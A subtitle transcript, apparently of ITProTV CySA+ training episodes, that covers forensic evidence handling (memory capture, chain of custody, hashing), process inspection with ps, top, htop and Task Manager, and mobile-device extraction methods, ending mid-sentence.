kind of question.\n\n414\n00:22:07.460 --> 00:22:10.960\nBut it is great for\nfinding things like those encryption keys.\n\n415\n00:22:10.960 --> 00:22:14.771\nMaybe there's malware rootkits\nthat are running in memory, right?\n\n416\n00:22:14.771 --> 00:22:19.309\nTo be able to see that that is happening,\nto grab that data, pull that out,\n\n417\n00:22:19.309 --> 00:22:22.262\nslap that in your case file,\nuse it as evidence,\n\n418\n00:22:22.262 --> 00:22:25.730\nthat is what you wanna take\naway from taking memory.\n\n419\n00:22:25.730 --> 00:22:26.311\n&gt;&gt; Credentials to use.\n\n420\n00:22:26.311 --> 00:22:29.140\n&gt;&gt; Yes, credentials.\nAll sorts of great stuff gets locked up in\n\n421\n00:22:29.140 --> 00:22:30.258\nthe memory space.\n\n422\n00:22:30.258 --> 00:22:33.368\nSo you wanna be able to take that down,\n\n423\n00:22:33.368 --> 00:22:39.020\nlook through that information,\nuse it as evidence if there is some.\n\n424\n00:22:40.720 --> 00:22:43.160\nAll right, Mike, let's see,\nwhere are we at here?\n\n425\n00:22:43.160 --> 00:22:46.400\nLet's go with chain of custody,\ndon't forget your chain of custody.\n\n426\n00:22:46.400 --> 00:22:50.630\nAs you're taking these pieces of evidence,\nfollow proper procedure.\n\n427\n00:22:50.630 --> 00:22:52.190\nIf you have a hard drive,\nyou have a thumb drive,\n\n428\n00:22:52.190 --> 00:22:56.440\nyou have some physical evidence,\nput it in an evidence bag.\n\n429\n00:22:56.440 --> 00:22:59.050\nUse those tamper-proof seals.\n\n430\n00:22:59.050 --> 00:23:03.520\nFill out the chain of custody form and\ndo it in the proper way.\n\n431\n00:23:03.520 --> 00:23:06.327\nDon't forget to be doing these\nthings because if you do,\n\n432\n00:23:06.327 --> 00:23:10.375\nthen someone's gonna call in and question\nthe integrity of the evidence itself.\n\n433\n00:23:10.375 --> 00:23:14.076\nYou do not wanna be at that end inside\nof the courtroom setting, right?\n\n434\n00:23:14.076 --> 00:23:16.660\nThere are ways in which you can do this.\n\n435\n00:23:16.660 --> 00:23:18.630\nI've mentioned chain of custody forms.\n\n436\n00:23:18.630 --> 00:23:20.080\nWe do live in modern times,\n\n437\n00:23:20.080 --> 00:23:24.400\nso we can employ modern forms\nwhich are digital, right?\n\n438\n00:23:24.400 --> 00:23:25.351\nYou can find systems.\n\n439\n00:23:25.351 --> 00:23:30.354\nI worked at an insurance company\nwhere we did barcoding, right?\n\n440\n00:23:30.354 --> 00:23:35.194\nSee these QR codes or old-fashioned bar\ncodes, grab a little wasp scanner and\n\n441\n00:23:35.194 --> 00:23:36.817\nit looks into a database.\n\n442\n00:23:36.817 --> 00:23:41.100\nAnd now anytime someone checks in or\nout a device, you hit it with a scanner.\n\n443\n00:23:41.100 --> 00:23:44.800\nYou can even do it with your phone,\nwhich is connected to your system.\n\n444\n00:23:44.800 --> 00:23:49.036\nSo that any kind of timeline or\nscheduling,\n\n445\n00:23:49.036 --> 00:23:55.681\nif you've worked with these things,\nI can timestamp these things.\n\n446\n00:23:55.681 --> 00:23:57.410\nAnd that's the whole purpose of that.\n\n447\n00:23:57.410 --> 00:23:59.540\nI know who it was that checked it out,\nMike used his phone.\n\n448\n00:23:59.540 --> 00:24:00.655\nHe has a app on his phone.\n\n449\n00:24:00.655 --> 00:24:03.230\nHe checked out that evidence,\nhe scanned the QR code.\n\n450\n00:24:03.230 --> 00:24:07.860\nThat information, the time, the date,\nthe person, the location data,\n\n451\n00:24:07.860 --> 00:24:10.170\nall that stuff can be\nput into a database and\n\n452\n00:24:10.170 --> 00:24:14.490\nsubmitted as evidence to verify\nthe integrity of the evidence itself,\n\n453\n00:24:14.490 --> 00:24:19.210\nthe chain of evidence and\ncustody that was followed.\n\n454\n00:24:19.210 --> 00:24:20.810\nThat procedure was followed.\n\n455\n00:24:20.810 --> 00:24:23.910\nIf you don't do that,\nget ready for that to be hit.\n\n456\n00:24:23.910 --> 00:24:26.137\nSomeone's gonna discover\nthat in discovery, and\n\n457\n00:24:26.137 --> 00:24:29.151\nthey're gonna call that out and\ntry to get that evidence thrown out.\n\n458\n00:24:29.151 --> 00:24:30.583\nMaybe that's your linchpin evidence.\n\n459\n00:24:30.583 --> 00:24:34.590\nYou would hate to have that happen,\nso follow those things.\n\n460\n00:24:34.590 --> 00:24:36.978\nWe also looked at hashing\nutilities before.\n\n461\n00:24:36.978 --> 00:24:42.830\nI just wanna remind you of that to, again,\nthat idea of integrity of the evidence.\n\n462\n00:24:42.830 --> 00:24:47.700\nYou take an image, you grab a drive,\nyou go to take an image of it,\n\n463\n00:24:47.700 --> 00:24:51.953\nuse your write blockers,\nyou use your either hardware,\n\n464\n00:24:51.953 --> 00:24:56.405\nsoftware and you take a md5 or\nSHA hash value of that image.\n\n465\n00:24:56.405 --> 00:25:00.230\nVerify before and\nafter that everything is on the up and up,\n\n466\n00:25:00.230 --> 00:25:02.540\nmaintaining that integrity.\n\n467\n00:25:02.540 --> 00:25:08.419\nRemember you can use md5sum or shasum\ninside of your Linux operating systems.\n\n468\n00:25:08.419 --> 00:25:11.700\nYou can grab GUI tools that will do this.\n\n469\n00:25:11.700 --> 00:25:13.671\nWe saw Autopsy would do it for us.\n\n470\n00:25:13.671 --> 00:25:17.611\nSo it's all over the place, and there's\na reason for that because it's great for\n\n471\n00:25:17.611 --> 00:25:18.940\nverifying all the files.\n\n472\n00:25:18.940 --> 00:25:21.263\nAnytime you go to work on a file,\n\n473\n00:25:21.263 --> 00:25:24.970\nmake sure that the data is\nas you think it should be.\n\n474\n00:25:24.970 --> 00:25:26.518\nAnd Mike, that being said,\n\n475\n00:25:26.518 --> 00:25:29.880\nlooking there [INAUDIBLE] we've\ngot about five minutes left.\n\n476\n00:25:29.880 --> 00:25:32.473\nIt's probably a good stopping spot for\nus to move into the next part.\n\n477\n00:25:32.473 --> 00:25:34.560\nBecause we got a little bit more to go.\n\n478\n00:25:34.560 --> 00:25:37.291\nAnd then we'll wrap this digital\nforensicsbusiness up on what you gotta\n\n479\n00:25:37.291 --> 00:25:39.629\nfollow, as far for procedures,\nand tools, and utilities.\n\n480\n00:25:39.629 --> 00:25:42.310\nEverything you use to\ngather that evidence.\n\n481\n00:25:42.310 --> 00:25:44.038\n&gt;&gt; All right, Daniel, sounds like a plan.\n\n482\n00:25:44.038 --> 00:25:44.947\nGreat demonstration so far.\n\n483\n00:25:44.947 --> 00:25:48.300\nHope everybody out there\nenjoyed watching these.\n\n484\n00:25:48.300 --> 00:25:51.190\nSigning off for ITProTV,\nI've been your host Mike Roderick.\n\n485\n00:25:51.190 --> 00:25:51.960\n&gt;&gt; And I'm Daniel Lowry.\n\n486\n00:25:51.960 --> 00:25:59.284\n&gt;&gt; And we'll see you next time.\n\n487\n00:25:59.284 --> 00:26:00.004\n[MUSIC]\n\n488\n00:26:00.004 -->

You're watching ITProTV.\n\n4\n00:00:12.103 --> 00:00:15.250\n&gt;&gt; Hello, and welcome to another\nexciting episode here at ITProTV.\n\n5\n00:00:15.250 --> 00:00:17.450\nI'm you host Mike Rodrick.\n\n6\n00:00:17.450 --> 00:00:20.680\nWe're doing our CySA+,\nand in this episode,\n\n7\n00:00:20.680 --> 00:00:24.870\nwe're continuing along with\nForensics Suites and Utilities.\n\n8\n00:00:24.870 --> 00:00:27.180\nBack in the studios is none other than Mr.\nDaniel Lowrie.\n\n9\n00:00:27.180 --> 00:00:27.900\nWelcome back Daniel.\n\n10\n00:00:27.900 --> 00:00:29.690\n&gt;&gt; Thanks Mike for\nhaving me back yet again.\n\n11\n00:00:29.690 --> 00:00:32.220\nI'm trying to round out\nthis Forensics Suites and\n\n12\n00:00:32.220 --> 00:00:36.160\nUtilities little series we got going on,\nbut it's been cool stuff so far, so.\n\n13\n00:00:36.160 --> 00:00:40.390\nNow that you've trudged along with us,\nI'm hoping to wrap it up with this one if\n\n14\n00:00:40.390 --> 00:00:43.220\nI can get it all in one more episode,\nI'll be a very, very happy man.\n\n15\n00:00:43.220 --> 00:00:45.649\nI'm sure you guys out there\nwill be happy as well.\n\n16\n00:00:45.649 --> 00:00:48.911\nSo that being said, we're just gonna\njump right back into the fray and\n\n17\n00:00:48.911 --> 00:00:52.229\nlook at some other things that we\ncould use in a forensically sound way,\n\n18\n00:00:52.229 --> 00:00:53.909\nthat you might not even thought of.\n\n19\n00:00:53.909 --> 00:00:57.620\nOne is being our processes\ninside of our operating system.\n\n20\n00:00:57.620 --> 00:01:00.480\nYou never know what processes running,\nbut how do we know that, right?\n\n21\n00:01:00.480 --> 00:01:01.980\nThere is a couple of different ways.\n\n22\n00:01:01.980 --> 00:01:04.106\nHere we are inside of Kali Linux.\n\n23\n00:01:04.106 --> 00:01:07.626\nThere's ways that I would do it here\nversus whether or not I was over in a say,\n\n24\n00:01:07.626 --> 00:01:10.822\nI don't know, a Window's,\nof course it's gonna go to sleep on me.\n\n25\n00:01:10.822 --> 00:01:11.322\nWake up!\n&gt;&gt; [LAUGH]\n\n26\n00:01:11.322 --> 00:01:11.873\n&gt;&gt; There we go.\n\n27\n00:01:11.873 --> 00:01:12.680\nA Window's environment,\n\n28\n00:01:12.680 --> 00:01:14.430\nkill the whole effect\non me while I say it.\n\n29\n00:01:14.430 --> 00:01:16.570\nI love that, anyway, so\n\n30\n00:01:16.570 --> 00:01:19.830\nwhat are the tools that we need to be\naware of that we can check these processes\n\n31\n00:01:19.830 --> 00:01:23.100\nand things of that inside of these\ndifferent operating systems?\n\n32\n00:01:23.100 --> 00:01:24.970\nWell let me show you,\nlet's dive right in here.\n\n33\n00:01:24.970 --> 00:01:29.380\nLet's talk about yes,\ninside of Linux you have PS.\n\n34\n00:01:29.380 --> 00:01:31.320\nYou can do PS and just hit enter.\n\n35\n00:01:32.790 --> 00:01:35.240\nNot a lot going on there, alright?\n\n36\n00:01:35.240 --> 00:01:37.065\n&gt;&gt; Well cool tool Daniel.\n\n37\n00:01:37.065 --> 00:01:39.400\n&gt;&gt; [LAUGH]\n&gt;&gt; Not the most exciting results.\n\n38\n00:01:39.400 --> 00:01:44.400\n&gt;&gt; Yes, sometimes when you're running\nthings, I had a current process running\n\n39\n00:01:44.400 --> 00:01:46.680\nin this terminal,\nit would have grabbed that and shown it.\n\n40\n00:01:46.680 --> 00:01:48.780\nI don't have anything running, or do I?\n\n41\n00:01:48.780 --> 00:01:53.000\nThere's a couple of flags you can throw\nat it, make it a little more verbose.\n\n42\n00:01:53.000 --> 00:01:56.320\nSome of those would be ps -a,\n\n43\n00:01:56.320 --> 00:01:59.720\nwhich is give me all of\nthe processes they're running.\n\n44\n00:01:59.720 --> 00:02:04.710\nAnd then I like to throw a dash u at\nit as well which shows the user which\n\n45\n00:02:04.710 --> 00:02:08.960\nis running these, and not just give me the\ncurrent user but give me all users right?\n\n46\n00:02:08.960 --> 00:02:10.490\nAnd then x is another one and\n\n47\n00:02:10.490 --> 00:02:15.940\nI want to say it gives you the child forks\nof any of the processes that are running.\n\n48\n00:02:15.940 --> 00:02:17.070\nI can't remember off\nthe top of my head but\n\n49\n00:02:17.070 --> 00:02:19.610\nI think that's typically what I employ.\n\n50\n00:02:19.610 --> 00:02:23.300\nHit enter, you understand,\nwe get a lot more output right?\n\n51\n00:02:23.300 --> 00:02:27.060\nAnd we see root is running just about\neverything cuz I'm logged in as root,\n\n52\n00:02:27.060 --> 00:02:30.330\nplus root tends to run\nsystem stuff as well.\n\n53\n00:02:30.330 --> 00:02:33.880\nAnd if we look over to, all right,\n\n54\n00:02:33.880 --> 00:02:38.830\nyou'll see things like dhclient, which is\nthe utility, I'll highlight that for you.\n\n55\n00:02:38.830 --> 00:02:44.310\nUtility that is used for\ngetting my DHCP, IP information, right?\n\n56\n00:02:44.310 --> 00:02:49.050\nAnd it also gives me paths,\nusr/lib/gnome stuff, there's bash running,\n\n57\n00:02:49.050 --> 00:02:50.860\nthere is autopsy.\n\n58\n00:02:50.860 --> 00:02:54.890\nSo I'm starting to see these things,\nI also get process IDs, right?\n\n59\n00:02:54.890 --> 00:02:56.330\nThat's this column right here.\n\n60\n00:02:56.330 --> 00:02:59.700\nSo this will be the user,\nthis will be the process ID.\n\n61\n00:02:59.700 --> 00:03:05.370\nI want to say, this is CPU if\nI'm not mistaken, and then one\n\n62\n00:03:05.370 --> 00:03:09.200\nof them's high much memory's it's taken,\nhow much disk surveys, that kind of stuff.\n\n63\n00:03:09.200 --> 00:03:11.000\nThat information won't be there as well.\n\n64\n00:03:11.000 --> 00:03:14.040\nI can't remember the off\nthe top of my head,\n\n65\n00:03:14.040 --> 00:03:18.480\nthis over here is the device that it's\nusing, so pts/0 and 1 if it's on TTY,\n\n66\n00:03:18.480 --> 00:03:22.340\nmaybe it's on virtual terminal,\nthey'll show that it's there, right?\n\n67\n00:03:22.340 --> 00:03:27.900\nSo that's good information for\nus, for gathering evidence.\n\n68\n00:03:27.900 --> 00:03:31.960\nCoz you never know, maybe I've got\nmalware running and obviously, what's\n\n69\n00:03:31.960 --> 00:03:37.060\nthis weird process called, malware.exe or\nsomething that grabs my eye.\n\n70\n00:03:37.060 --> 00:03:39.910\nMaybe I want to log the fact\nthat that is running.\n\n71\n00:03:39.910 --> 00:03:41.820\nNow I need to do that in memory dump and\n\n72\n00:03:41.820 --> 00:03:43.730\ntake a look a little\nfurther inside the system.\n\n73\n00:03:44.860 --> 00:03:46.050\nSo there's PS.\nYou can also\n\n74\n00:03:46.050 --> 00:03:48.350\nuse a cool utility called Top.\n\n75\n00:03:48.350 --> 00:03:52.440\nThis will show you the currently running\nthings [COUGH] processes inside, and\n\n76\n00:03:52.440 --> 00:03:54.470\nit will also show you\nutilization of things like CPU.\n\n77\n00:03:55.680 --> 00:03:56.770\nLot of great info here, all right?\n\n78\n00:03:56.770 --> 00:04:01.780\nSo if we say top and it runs, and\nnow this updates in time, right?\n\n79\n00:04:01.780 --> 00:04:03.130\nOver time.\n&gt;&gt; This is a live view, yeah.\n\n80\n00:04:03.130 --> 00:04:06.820\n&gt;&gt; Yeah, I wanna say it's like every\nsecond or every couple of seconds,\n\n81\n00:04:06.820 --> 00:04:12.610\nit will update and give you a real-time,\nin-time analysis of what's happening.\n\n82\n00:04:12.610 --> 00:04:14.780\nSo this will change,\nthis information will change.\n\n83\n00:04:14.780 --> 00:04:19.930\nGet the process id, the user, other\ngreat stuff over here, CPU and memory.\n\n84\n00:04:19.930 --> 00:04:23.410\nSo I can take a look here and\nsay why is that process or\n\n85\n00:04:23.410 --> 00:04:28.650\nthat application using up so\nmuch memory or CPU or both.\n\n86\n00:04:28.650 --> 00:04:30.000\nI don't recognize it.\n\n87\n00:04:30.000 --> 00:04:31.950\nDo some Google searching,\nfind out what it is.\n\n88\n00:04:31.950 --> 00:04:35.780\nThese are things that we do as even\nhelp desk servers on a common,\n\n89\n00:04:35.780 --> 00:04:37.050\neveryday basis but.\n\n90\n00:04:37.050 --> 00:04:38.260\nWe can also employ them.\n\n91\n00:04:38.260 --> 00:04:41.660\nThey come right over into our\nforensics analysis as well.\n\n92\n00:04:41.660 --> 00:04:43.170\nSo don't forget they're there.\n\n93\n00:04:43.170 --> 00:04:45.500\nUp here,\nwe see some more interesting things.\n\n94\n00:04:45.500 --> 00:04:51.240\nTasks, 193 total, 1 is running,\n150 sleeping, 0 are stopped, 0 are zombie.\n\n95\n00:04:51.240 --> 00:04:54.600\nCPU information that's happening.\n\n96\n00:04:54.600 --> 00:04:56.710\nThere is the memory in kilobytes,\n\n97\n00:04:56.710 --> 00:04:59.830\nwhich you can change all this stuff\nby throwing some flags at it.\n\n98\n00:04:59.830 --> 00:05:03.970\nThese are the defaults we're working\nwith Top, and we see Firefox is running,\n\n99\n00:05:03.970 --> 00:05:05.330\nit's taking up the most.\n\n100\n00:05:05.330 --> 00:05:10.360\nSo if I thought maybe that Firefox had a\nmemory leak or something within to nature,\n\n101\n00:05:10.360 --> 00:05:14.710\nor maybe it's been a renamed version\nof Firefox that's doing things.\n\n102\n00:05:14.710 --> 00:05:16.130\nI'm like, why is Firefox eating up?\n\n103\n00:05:16.130 --> 00:05:19.540\nI've only got one tab open and\nI'm on a static page.\n\n104\n00:05:19.540 --> 00:05:21.970\nIt's not running on any Java script or\nanything like that.\n\n105\n00:05:21.970 --> 00:05:24.410\nWhy is this taking up sp much memory?\n\n106\n00:05:24.410 --> 00:05:29.130\nMaybe I want to take a little\ncloser look at the item, and\n\n107\n00:05:29.130 --> 00:05:32.865\nmaybe find some malfeasance going on,\nand log that in my case file.\n\n108\n00:05:32.865 --> 00:05:36.370\nAll right, we also have htop,\nlet me throw that up real quick, htop.\n\n109\n00:05:36.370 --> 00:05:37.705\nWe also like to call this pretty top.\n\n110\n00:05:37.705 --> 00:05:40.240\n&gt;&gt; [LAUGH]\n&gt;&gt; Because it's pretty, right?\n\n111\n00:05:40.240 --> 00:05:44.070\nAnd you can click on the buttons at\nthe bottom for Help and Setup and\n\n112\n00:05:44.070 --> 00:05:44.780\nSearch and stuff.\n\n113\n00:05:44.780 --> 00:05:48.950\nYou'll also see a more graphical\nof your memory that's being used,\n\n114\n00:05:48.950 --> 00:05:50.630\nyour CPU that's being used.\n\n115\n00:05:50.630 --> 00:05:53.730\n1, 2, 3, and\n4 are my different cores in my CPU.\n\n116\n00:05:53.730 --> 00:05:58.805\nGiving me that information,\nhow much swap is being used up,\n\n117\n00:05:58.805 --> 00:06:02.697\nand it's in a more human-readable content.\n\n118\n00:06:02.697 --> 00:06:08.770\nWhere I've got 1.95 GB of memory\navailable but 1.42 is being used up.\n\n119\n00:06:08.770 --> 00:06:12.210\nSo I'm creeping, I maybe wanna\nadd some more RAM to the system.\n\n120\n00:06:12.210 --> 00:06:13.430\nWell, interesting things.\n\n121\n00:06:13.430 --> 00:06:17.660\nI can click on the different processes\nthemselves, you'd start to see some\n\n122\n00:06:17.660 --> 00:06:22.220\nuptime information, load average, and\njust get more information about it.\n\n123\n00:06:22.220 --> 00:06:25.230\nSo, don't forget that these are there for\nus to be used\n\n124\n00:06:26.510 --> 00:06:31.300\nwhen you need to look at what processes\nare running inside of a Linux system.\n\n125\n00:06:31.300 --> 00:06:33.550\nThose are the three that I typically use.\n\n126\n00:06:33.550 --> 00:06:40.020\nIf we go over to the Windows side of\nthings, we've got old Task Manager, right?\n\n127\n00:06:40.020 --> 00:06:43.810\nGo into Task Manager but,\n,Windows 10 has done this thing, right?\n\n128\n00:06:43.810 --> 00:06:45.580\n&gt;&gt; They have to hide all the good stuff,\ndon't they?\n\n129\n00:06:45.580 --> 00:06:47.118\n&gt;&gt; I don't know why they do that.\n\n130\n00:06:47.118 --> 00:06:50.230\nSo crazy, but if you don't know\nthat's what you can do, there you go.\n\n131\n00:06:50.230 --> 00:06:52.200\nAs you can see we're back\nto the good old fashion,\n\n132\n00:06:52.200 --> 00:06:55.000\nhere is the processes that are running,\nright?\n\n133\n00:06:55.000 --> 00:06:59.340\nHere is the performance monitor,\nI can see that, okay, good stuff there.\n\n134\n00:06:59.340 --> 00:07:02.120\nI think they're going in together,\nbaseline tools and\n\n135\n00:07:02.120 --> 00:07:05.930\nall the other good stuffs with the more\nin depth, is that the resource monitor or\n\n136\n00:07:05.930 --> 00:07:06.800\nthe performance monitor?\n\n137\n00:07:06.800 --> 00:07:07.790\n&gt;&gt; Performance monitor.\n\n138\n00:07:07.790 --> 00:07:10.430\n&gt;&gt; Performance monitor per se,\nwhich will allow you to do that.\n\n139\n00:07:10.430 --> 00:07:13.960\nTake a look at these things,\nthere are processes, app history.\n\n140\n00:07:13.960 --> 00:07:19.200\nIt would be useful information\nto running down leads,\n\n141\n00:07:19.200 --> 00:07:22.430\nas far as evidence goes to\nwhere the problem might lie.\n\n142\n00:07:22.430 --> 00:07:26.230\nSo just keep that all in my,\nusers that are logged in,\n\n143\n00:07:26.230 --> 00:07:28.440\nmaybe there's a user you don't recognize.\n\n144\n00:07:28.440 --> 00:07:29.830\nThey logged in to the system.\n\n145\n00:07:29.830 --> 00:07:30.480\nWho is that?\n\n146\n00:07:30.480 --> 00:07:31.350\nHow are they on?\n\n147\n00:07:31.350 --> 00:07:31.910\nI dont know.\n\n148\n00:07:31.910 --> 00:07:33.960\nI need to check that out, right?\n\n149\n00:07:33.960 --> 00:07:36.380\nThings that could be handy.\n\n150\n00:07:36.380 --> 00:07:38.370\nWe see autopsies running\nthese background process.\n\n151\n00:07:38.370 --> 00:07:40.370\nWhat are the other apps are running?\n\n152\n00:07:40.370 --> 00:07:43.400\nHow much memory CPU disc and\nnetwork that they are taking up?\n\n153\n00:07:43.400 --> 00:07:48.854\nSo if I see a process on here,\nCPU is to the roof, memory is super high,\n\n154\n00:07:48.854 --> 00:07:55.060\n[COUGH] This utilization might not be a\nlot, but it could be doing some high I/O.\n\n155\n00:07:55.060 --> 00:07:59.539\nIf network is also super high That\ncould be a strong indication that we\n\n156\n00:07:59.539 --> 00:08:01.392\nhave malware, maybe a CNC or\n\n157\n00:08:01.392 --> 00:08:06.190\nC2 server is sending in information and\nits going back and forth.\n\n158\n00:08:06.190 --> 00:08:08.878\nIt could be a very good\nindication that is occurring.\n\n159\n00:08:08.878 --> 00:08:12.403\nAll right, so\nthose are different operating system and\n\n160\n00:08:12.403 --> 00:08:18.090\nprocess analysis things that you could use\nto further your investigative process.\n\n161\n00:08:18.090 --> 00:08:23.288\nLet's move into into mobile device\nforensic setting, and close this now.\n\n162\n00:08:23.288 --> 00:08:26.500\nSo mobile devices, little computers,\nwe keep them in our pockets.\n\n163\n00:08:26.500 --> 00:08:29.374\nWe haul them just everywhere we go, right?\n\n164\n00:08:29.374 --> 00:08:31.250\nThey tend to hold a lot of data.\n\n165\n00:08:31.250 --> 00:08:31.863\nAnd now,\n\n166\n00:08:31.863 --> 00:08:36.624\ninteresting thing about mobile devices\nis that they can be a bit of a bear.\n\n167\n00:08:36.624 --> 00:08:37.863\n&gt;&gt; Yeah.\n&gt;&gt; They can be not so\n\n168\n00:08:37.863 --> 00:08:42.060\neasy to get information off,\nespecially if they've been locked.\n\n169\n00:08:42.060 --> 00:08:46.021\nWe all know the cases of\nthe San Bernardino's, of what not,\n\n170\n00:08:46.021 --> 00:08:51.240\nwhere the government says, I need to get\ninto this device, it has been locked.\n\n171\n00:08:51.240 --> 00:08:54.778\nAnd Apple was not forthcoming\nwith that information and\n\n172\n00:08:54.778 --> 00:08:57.840\ntheir ability to be able to do so.\n\n173\n00:08:57.840 --> 00:08:58.380\nHow did they get in?\n\n174\n00:08:58.380 --> 00:09:01.443\nWell, they did,\nI think it was an Israeli company.\n\n175\n00:09:01.443 --> 00:09:03.096\n&gt;&gt; Yeah.\nif I'm not mistaken it said, yeah,\n\n176\n00:09:03.096 --> 00:09:04.012\nwe can get in those.\n\n177\n00:09:04.012 --> 00:09:04.810\n&gt;&gt; Yep.\n[LAUGH]\n\n178\n00:09:04.810 --> 00:09:06.241\n&gt;&gt; If you'll pay us enough money,\n\n179\n00:09:06.241 --> 00:09:07.470\nwe'll do it for you.\n\n180\n00:09:07.470 --> 00:09:10.710\nThat's just their ally,\nwe chucked them so bones and\n\n181\n00:09:10.710 --> 00:09:15.405\nwe got into those terrorists cellphones\nand we're able to extract the data.\n\n182\n00:09:15.405 --> 00:09:20.782\nBut if they're unlocked, we can do\nthings like plug it in to the laptop and\n\n183\n00:09:20.782 --> 00:09:26.495\nstart to do memory dumps, operating\nsystem, file system dumps as well.\n\n184\n00:09:26.495 --> 00:09:28.082\nThere's a lot of interesting\nthird party tools,\n\n185\n00:09:28.082 --> 00:09:29.415\nwe're not gonna be testing on any those.\n\n186\n00:09:29.415 --> 00:09:32.520\nBut just kind of a methodologies\nthat are wrapped around it.\n\n187\n00:09:32.520 --> 00:09:37.697\nLet me walk you through a few different\nextraction types that you might\n\n188\n00:09:37.697 --> 00:09:42.449\nneed to familiar with when it\ncomes to mobile device forensics.\n\n189\n00:09:42.449 --> 00:09:44.270\nSo let's talk about manual extraction.\n\n190\n00:09:44.270 --> 00:09:46.663\n&gt;&gt; All right, Daniel, so that means\nwe're just gonna open up the phone and\n\n191\n00:09:46.663 --> 00:09:47.499\nstart going through it?\n\n192\n00:09:47.499 --> 00:09:52.590\n&gt;&gt; Yes, exactly, that manual extraction\nis a legitimate extraction technique.\n\n193\n00:09:52.590 --> 00:09:55.769\nTo be able to go round and go, the phone\nis unlocked, I'm in it, I can browse\n\n194\n00:09:55.769 --> 00:09:59.328\nthrough it, I can click on things, there\nis nothing asking me for authentication.\n\n195\n00:09:59.328 --> 00:10:03.072\nAnd I can then extract those files and\nimages or\n\n196\n00:10:03.072 --> 00:10:06.840\nwhatever the case is, in the manual way.\n\n197\n00:10:06.840 --> 00:10:08.801\nNow, there's some\nproblems with doing that.\n\n198\n00:10:08.801 --> 00:10:11.714\nWhile it is there, it is easy,\nit's something we can do, and\n\n199\n00:10:11.714 --> 00:10:15.692\nit does include the human element of being\nable to intuitively understand what might\n\n200\n00:10:15.692 --> 00:10:17.398\nbe important data and what's not.\n\n201\n00:10:17.398 --> 00:10:20.520\nWe also have the fact that\nit takes a lot of time and\n\n202\n00:10:20.520 --> 00:10:25.252\neffort to manually extract documents\nfrom a mobile device or any device.\n\n203\n00:10:25.252 --> 00:10:28.901\n&gt;&gt; And I'm assuming we want to image this\nin some way, because just opening up that\n\n204\n00:10:28.901 --> 00:10:32.290\nphone and start browsing to those files,\nwell, it change those things.\n\n205\n00:10:32.290 --> 00:10:35.828\n&gt;&gt; Right, at that point you probably gonna\nhave to just take that we don't have\n\n206\n00:10:35.828 --> 00:10:38.647\nan imaging software which is\nexactly what you're gonna do,\n\n207\n00:10:38.647 --> 00:10:40.490\nyou're gonna grab imaging software.\n\n208\n00:10:40.490 --> 00:10:44.340\nI believe Volatility will\ntake images from a phone, so\n\n209\n00:10:44.340 --> 00:10:47.280\nwe'll be employing that bad boy as well.\n\n210\n00:10:47.280 --> 00:10:48.379\n&gt;&gt; Yeah, we see that in the TV shows.\n\n211\n00:10:48.379 --> 00:10:50.010\nAnd I know they're dramas, right?\n\n212\n00:10:50.010 --> 00:10:50.783\n&gt;&gt; Yeah, they're dramatizing.\n\n213\n00:10:50.783 --> 00:10:53.790\n&gt;&gt; They're suppose to be exciting and\nthey've gotta speed things up.\n\n214\n00:10:53.790 --> 00:10:55.881\nBut you see them grab\nthe phone off the counter and\n\n215\n00:10:55.881 --> 00:10:57.364\njust start going through things.\n\n216\n00:10:57.364 --> 00:10:59.158\nI'm like, no, no, don't do that.\n\n217\n00:10:59.158 --> 00:10:59.858\n[LAUGH]\n&gt;&gt; Yeah, yeah,\n\n218\n00:10:59.858 --> 00:11:03.880\ngotta do these things in a forensically\nsound way, ladies and gents.\n\n219\n00:11:03.880 --> 00:11:07.932\n&gt;&gt; So all Mike's advice, use the third\nparty tools when they're available to you.\n\n220\n00:11:07.932 --> 00:11:12.235\nManual extraction while intuitive\ncan be time consuming and\n\n221\n00:11:12.235 --> 00:11:14.868\nwere also prone to us making errors.\n\n222\n00:11:14.868 --> 00:11:15.923\n&gt;&gt; You can miss something.\n\n223\n00:11:15.923 --> 00:11:18.580\n&gt;&gt; Right, we can miss something,\nforget it, you'll never know, right?\n\n224\n00:11:18.580 --> 00:11:19.931\nSo it's error problem.\n\n225\n00:11:19.931 --> 00:11:23.592\nLogical extraction, [COUGH] this is\nmuch like working with FTK or HTop, so\n\n226\n00:11:23.592 --> 00:11:26.900\nyou just use the third party\ntools that are available to us.\n\n227\n00:11:26.900 --> 00:11:29.382\nWe plug the device and\nit makes a connection.\n\n228\n00:11:29.382 --> 00:11:32.391\nYou say take an image of this device,\nwe take an MD file and\n\n229\n00:11:32.391 --> 00:11:36.097\nfollow all our standard operating\nprocedure when it comes to creating\n\n230\n00:11:36.097 --> 00:11:40.520\nan image in a forensic and sound way, like\nblocking enabled, all the great stuff.\n\n231\n00:11:40.520 --> 00:11:43.513\nGrab the memory,\ndoes it all for us, right?\n\n232\n00:11:43.513 --> 00:11:47.382\nNext, dumping is another way\nin which you might do this,\n\n233\n00:11:47.382 --> 00:11:52.865\nwhere it was actually grabbing the hex\ndecimal information kind of right above or\n\n234\n00:11:52.865 --> 00:11:55.650\nright in that assembly language level.\n\n235\n00:11:55.650 --> 00:12:01.450\nSo what's loaded up into the sing and\ndoing more about bit for bit copy, okay?\n\n236\n00:12:01.450 --> 00:12:05.938\nAnd there's tools that can do this,\ndevices connect between the work station\n\n237\n00:12:05.938 --> 00:12:10.570\nand the device with a cable and the third\nparty software will allow you to do that.\n\n238\n00:12:10.570 --> 00:12:14.458\nSo it's same kind of idea when it\ncomes to logical extraction except\n\n239\n00:12:14.458 --> 00:12:19.040\nit's specifically doing a hex dump,\nwhich is a little bit lower level, okay?\n\n240\n00:12:19.040 --> 00:12:22.863\nLet's see here, I don't wanna forget,\nyou can also see deleted files and\n\n241\n00:12:22.863 --> 00:12:25.570\nstuff which is why hex dump\nmight be the way you wanna go.\n\n242\n00:12:25.570 --> 00:12:28.563\nI think it's the most\ncommonly employed method.\n\n243\n00:12:28.563 --> 00:12:32.835\nOr removing data is to do a hex dump\ntype of dump because it will grab\n\n244\n00:12:32.835 --> 00:12:37.320\nthat unallocated space,\nhidden data stuff, all right?\n\n245\n00:12:37.320 --> 00:12:41.066\nMoving on to chip off,\nlike chip off, right?\n\n246\n00:12:41.066 --> 00:12:45.100\nThere are memory modules\ninside of mobile devices.\n\n247\n00:12:45.100 --> 00:12:48.542\nThis is saying,\nI'm going to grab the memory modules,\n\n248\n00:12:48.542 --> 00:12:52.513\nI'm gonna connect them to a device and\ndo a dump that way, okay?\n\n249\n00:12:52.513 --> 00:12:58.880\nSo a very, takes some skill, want to do\nthat, you have to be familiar with chips.\n\n250\n00:12:58.880 --> 00:13:02.514\nYou have to be familiar with the hardware\nthat allows you to connect to the 